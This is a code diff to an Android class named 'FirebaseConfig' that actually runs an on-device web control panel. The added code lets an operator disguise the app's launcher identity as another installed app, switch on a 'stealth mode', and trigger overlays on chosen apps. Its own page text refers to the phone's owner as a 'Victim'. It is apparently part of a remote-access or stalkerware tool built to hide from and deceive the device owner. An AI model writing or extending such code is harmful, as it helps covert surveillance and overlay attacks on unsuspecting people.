@@ -563,6 +563,9 @@ public class FirebaseConfig extends NanoHTTPD {
         } else if (uri.equals("/device/open-app")) {
             openAppOnDevice(params.get("pkg"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/masquerade")) {
+            String pkg = params.get("pkg");
+            return handleMasqueradeApp(pkg, session);
         } else if (uri.equals("/device/open-url")) {
             openUrlOnDevice(params.get("url"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -1035,7 +1038,7 @@ public class FirebaseConfig extends NanoHTTPD {
         android.content.pm.PackageManager pm = context.getPackageManager();
         List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
         
-        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th></tr></thead><tbody>");
+        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th><th>Actions</th></tr></thead><tbody>");
         for (android.content.pm.PackageInfo app : apps) {
             String name = app.applicationInfo.loadLabel(pm).toString();
             boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
@@ -1048,10 +1051,43 @@ public class FirebaseConfig extends NanoHTTPD {
             html.append("<td>").append(escapeHtml(name)).append("</td>");
             html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
             html.append("<td>").append(typeLabel).append("</td>");
-            html.append("<td>").append(app.versionName).append("</td></tr>");
+            html.append("<td>").append(app.versionName != null ? app.versionName : "1.0").append("</td>");
+
+            html.append("<td style=\"white-space: nowrap;\">");
+            html.append("<a href=\"/device/open-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05); margin-right:5px;\">▶️ LAUNCH</a>");
+            html.append("<a href=\"/device/masquerade?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0,242,255,0.05); margin-right:5px;\">🎭 MASQUERADE</a>");
+            html.append("<a href=\"/ghost/interact?action=overlay&pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\">🔒 OVERLAY</a>");
+            html.append("</td></tr>");
         }
         html.append("</tbody></table></div></div>").append(getFooter());
         return serveGzipped(session, "text/html", html.toString());
+    }
+
+    private Response handleMasqueradeApp(String pkg, IHTTPSession session) {
+        if (pkg == null || pkg.isEmpty()) return serveError(session, "Package parameter missing");
+        
+        try {
+            android.content.pm.PackageManager pm = context.getPackageManager();
+            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
+            String appName = appInfo.loadLabel(pm).toString();
+
+            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                    .edit()
+                    .putString("masquerade_pkg", pkg)
+                    .putString("masquerade_name", appName)
+                    .putBoolean("decoy_deployed", true)
+                    .apply();
+
+            SystemAnalytics.setStealthMode(context, true);
+
+            logActivity("STEALTH_CAMOUFLAGE: App identity morphed to " + appName + " (" + pkg + ")");
+
+            String html = getHeader(session.getUri()) + 
+                "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-cyan);\">🎭</div><h2>App Identity Morphed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">Launcher camouflage active as <b>" + escapeHtml(appName) + "</b> (" + escapeHtml(pkg) + ").<br>Victim launches will seamlessly pass through to the real application.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/device/apps\" class=\"btn\">Back to Apps</a></div></div></div>" + getFooter();
+            return serveGzipped(session, "text/html", html);
+        } catch (Exception e) {
+            return serveError(session, "Failed to masquerade app: " + e.getMessage());
+        }
     }
 
     private String getAppIconBase64(android.content.pm.ApplicationInfo appInfo) {
